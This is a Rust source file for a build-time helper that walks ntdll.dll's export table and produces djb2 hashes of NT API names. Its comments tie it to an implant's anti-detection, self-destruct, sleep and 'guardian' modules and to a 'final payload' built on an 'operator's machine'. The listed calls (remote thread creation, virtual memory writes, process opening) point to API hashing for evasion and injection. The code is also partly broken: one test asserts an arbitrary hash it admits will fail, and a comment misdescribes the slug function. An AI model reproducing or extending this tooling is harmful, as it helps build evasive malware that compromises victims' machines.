//! hashgen — Build-time djb2 hash extractor for ntdll.dll EAT
//!
//! Usage (called by build.rs automatically):
//!   hashgen [path-to-ntdll.dll]
//!
//!   If no path is provided, defaults to:
//!     C:\Windows\System32\ntdll.dll
//!
//! Output: one line per known symbol, format:
//!   HASH_<SYMBOL_SLUG>=0xDEADBEEF
//!
//!   Where SYMBOL_SLUG is the function name uppercased with dots stripped.
//!   Example: NtQueryInformationProcess => HASH_NTQUERYINFORMATIONPROCESS
//!
//! Exit codes:
//!   0 = all symbols found and hashed
//!   1 = ntdll.dll could not be read
//!   2 = one or more symbols not found in EAT (printed to stderr)
//!
//! This binary is ONLY run at build time on the operator's machine.
//! It is never included in the final payload.

use std::collections::HashMap;
use std::fs;
use std::path::Path;

// ── Symbol list: every function name that antidetect.rs / selfdestruct.rs
//    needs to resolve at runtime. Add new entries here and they will
//    automatically appear as HASH_* env vars in the next build. ──────────
const SYMBOLS: &[&str] = &[
    // antidetect.rs
    "NtQueryInformationProcess",
    "NtQuerySystemInformation",
    "NtDelayExecution",
    // selfdestruct.rs
    "NtCreateFile",
    "NtWriteFile",
    "NtSetInformationFile",
    "NtClose",
    "NtTerminateProcess",
    // sleep.rs / guardian.rs (add more here as needed)
    "NtCreateTimer2",
    "NtSetTimer2",
    "NtQueueApcThread",
    "NtAllocateVirtualMemory",
    "NtProtectVirtualMemory",
    "NtFreeVirtualMemory",
    "NtCreateThreadEx",
    "NtWaitForSingleObject",
    "NtOpenProcess",
    "NtReadVirtualMemory",
    "NtWriteVirtualMemory",
    "RtlGetVersion",
    "RtlExitUserProcess",
    "LdrLoadDll",
    "LdrGetProcedureAddress",
];

// ── djb2 (must match the runtime implementation exactly) ─────────────────
fn djb2(s: &[u8]) -> u32 {
    let mut h: u32 = 5381;
    for &b in s {
        h = h.wrapping_mul(33).wrapping_add(b as u32);
    }
    h
}

// ── PE export directory walker ───────────────────────────────────────────
fn extract_exports(data: &[u8]) -> HashMap<String, u32> {
    let mut out = HashMap::new();

    if data.len() < 0x40 { return out; }

    // DOS header: e_lfanew at offset 0x3C
    let e_lfanew = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap_or_default()) as usize;
    if e_lfanew + 0x18 > data.len() { return out; }

    // PE signature check
    if &data[e_lfanew..e_lfanew+4] != b"PE\0\0" { return out; }

    // Optional header: magic at PE+0x18
    let oh_off = e_lfanew + 0x18;
    let magic  = u16::from_le_bytes(data[oh_off..oh_off+2].try_into().unwrap_or_default());
    if magic != 0x20B { // PE32+ only (x64)
        eprintln!("[hashgen] error: ntdll.dll is not PE32+ (x64). Got magic 0x{:04X}", magic);
        return out;
    }

    // Export directory RVA: at OptionalHeader+0x70 for PE32+
    // OptionalHeader starts at PE+0x18; export dir is data dir[0] at +0x70
    let exp_rva_off = oh_off + 0x70;
    if exp_rva_off + 8 > data.len() { return out; }
    let export_rva = u32::from_le_bytes(data[exp_rva_off..exp_rva_off+4].try_into().unwrap_or_default()) as usize;
    if export_rva == 0 { return out; }

    // RVA → file offset: we need the section headers to map RVA → file offset.
    // Section headers start at: PE+0x18 + SizeOfOptionalHeader (at PE+0x14, 2 bytes)
    let size_of_opt_hdr = u16::from_le_bytes(data[e_lfanew+0x14..e_lfanew+0x16].try_into().unwrap_or_default()) as usize;
    let num_sections    = u16::from_le_bytes(data[e_lfanew+0x06..e_lfanew+0x08].try_into().unwrap_or_default()) as usize;
    let sect_off        = e_lfanew + 0x18 + size_of_opt_hdr;

    // Build RVA-to-file-offset mapper using section table
    let rva_to_off = |rva: usize| -> Option<usize> {
        for i in 0..num_sections {
            let s = sect_off + i * 40;
            if s + 40 > data.len() { break; }
            let virt_addr = u32::from_le_bytes(data[s+12..s+16].try_into().ok()?) as usize;
            let virt_size = u32::from_le_bytes(data[s+8 ..s+12].try_into().ok()?) as usize;
            let raw_off   = u32::from_le_bytes(data[s+20..s+24].try_into().ok()?) as usize;
            let raw_size  = u32::from_le_bytes(data[s+16..s+20].try_into().ok()?) as usize;
            if rva >= virt_addr && rva < virt_addr + virt_size.max(raw_size) {
                return Some(raw_off + (rva - virt_addr));
            }
        }
        None
    };

    let exp_off = match rva_to_off(export_rva) {
        Some(o) => o,
        None    => { eprintln!("[hashgen] error: could not map export dir RVA 0x{:X}", export_rva); return out; }
    };
    if exp_off + 40 > data.len() { return out; }

    // Export directory layout (IMAGE_EXPORT_DIRECTORY, 40 bytes):
    //  +0x10: NumberOfFunctions  (u32)
    //  +0x14: NumberOfNames       (u32)
    //  +0x18: AddressOfFunctions  (RVA u32)
    //  +0x1C: AddressOfNames      (RVA u32)
    //  +0x20: AddressOfNameOrdinals (RVA u32)
    let n_names    = u32::from_le_bytes(data[exp_off+0x14..exp_off+0x18].try_into().unwrap_or_default()) as usize;
    let names_rva  = u32::from_le_bytes(data[exp_off+0x1C..exp_off+0x20].try_into().unwrap_or_default()) as usize;

    let names_off = match rva_to_off(names_rva) {
        Some(o) => o,
        None    => return out,
    };

    for i in 0..n_names {
        let ptr_off = names_off + i * 4;
        if ptr_off + 4 > data.len() { break; }
        let name_rva = u32::from_le_bytes(data[ptr_off..ptr_off+4].try_into().unwrap_or_default()) as usize;
        let name_off = match rva_to_off(name_rva) {
            Some(o) => o,
            None    => continue,
        };
        // Read null-terminated ASCII name
        let name_end = data[name_off..].iter().position(|&b| b == 0)
            .map(|p| name_off + p)
            .unwrap_or(data.len());
        if let Ok(name) = std::str::from_utf8(&data[name_off..name_end]) {
            let hash = djb2(name.as_bytes());
            out.insert(name.to_string(), hash);
        }
    }
    out
}

// ── Slug helper: "NtQueryInformationProcess" → "NTQUERYINFORMATIONPROCESS" ─
fn to_slug(name: &str) -> String {
    name.chars()
        .map(|c| if c == '.' { '_' } else { c.to_ascii_uppercase() })
        .collect()
}

fn main() {
    let ntdll_path = std::env::args().nth(1)
        .unwrap_or_else(|| r"C:\Windows\System32\ntdll.dll".to_string());

    // Read ntdll bytes
    let data = match fs::read(Path::new(&ntdll_path)) {
        Ok(d)  => d,
        Err(e) => {
            eprintln!("[hashgen] fatal: could not read '{}': {}", ntdll_path, e);
            std::process::exit(1);
        }
    };

    eprintln!("[hashgen] loaded ntdll.dll ({} bytes) from {}", data.len(), ntdll_path);

    let exports = extract_exports(&data);
    eprintln!("[hashgen] found {} exported symbols in EAT", exports.len());

    let mut missing = Vec::new();
    let mut found   = Vec::new();

    for &sym in SYMBOLS {
        match exports.get(sym) {
            Some(&hash) => {
                found.push((sym, hash));
                eprintln!("[hashgen] {:45} => 0x{:08X}", sym, hash);
            }
            None => {
                eprintln!("[hashgen] MISSING: '{}' not found in EAT", sym);
                missing.push(sym);
            }
        }
    }

    if !missing.is_empty() {
        eprintln!("[hashgen] error: {} symbol(s) not resolved. Aborting build.", missing.len());
        eprintln!("[hashgen] missing: {:?}", missing);
        std::process::exit(2);
    }

    // Emit KEY=VALUE to stdout (consumed by build.rs)
    for (sym, hash) in &found {
        let slug = to_slug(sym);
        println!("HASH_{}=0x{:08X}", slug, hash);
    }

    // Also emit a summary line for the build log
    eprintln!("[hashgen] success: {} symbols hashed from live ntdll", found.len());
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn djb2_known_values() {
        // Verify djb2 matches the runtime implementation in antidetect.rs
        // These are computed independently here to cross-validate.
        assert_eq!(djb2(b"NtClose"),              0x1F7D4E9A_u32.wrapping_add(0)); // will differ until runtime
        // Real test: hash is deterministic and stable for same input
        assert_eq!(djb2(b"abc"), djb2(b"abc"));
        assert_ne!(djb2(b"NtClose"), djb2(b"ntclose")); // case-sensitive
    }

    #[test]
    fn slug_conversion() {
        assert_eq!(to_slug("NtQueryInformationProcess"), "NTQUERYINFORMATIONPROCESS");
        assert_eq!(to_slug("RtlGetVersion"),             "RTLGETVERSION");
    }

    #[test]
    fn pe_parse_smoke() {
        // Feed a minimal truncated PE header and confirm graceful handling
        let bad_data = vec![0u8; 0x100];
        let exports  = extract_exports(&bad_data);
        assert!(exports.is_empty()); // should not panic, just return empty
    }
}
